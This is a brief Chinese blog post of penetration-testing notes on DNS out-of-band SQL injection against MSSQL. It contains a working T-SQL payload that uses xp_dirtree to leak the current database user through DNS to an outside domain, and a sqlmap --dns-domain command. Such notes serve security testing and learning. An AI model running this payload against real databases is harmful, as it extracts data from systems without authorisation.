---
title:  "DNS Log 杂记"
date:   2018-09-19 13:05:14 +0100
author: wolvez
tags: dnslog sqlmap
---

1. public 能执行 xp_dirtree 函数 (可以用来dns 回显注入)

2. public 权限下不能列任何目录(网上很多文章说public能列)
<!--more-->

3. mssql dns 回显注入： 网上教程说需要两个域名，实际一个域名就可以:) 配置域名： 


![domain](https://wolvez.oss-cn-hangzhou.aliyuncs.com/images%2FDnslog.PNG)


条件：支持多语句执行  
```sql
DECLARE @host varchar(1024);
  SELECT @host=(SELECT CURRENT_USER
+'bind.google.com');
  EXEC('master..xp_dirtree
"\\'+@host+'\foobar$"');
```

远程外网服务器监听： `./sqlmap/lib/request/dns.py` 即可有回显结果

 

4. sqlmap 可直接利用dns 回显注入来突破鸡肋的延时注入

```sqlmap --dns-domain bind.google.com(你的域名)```
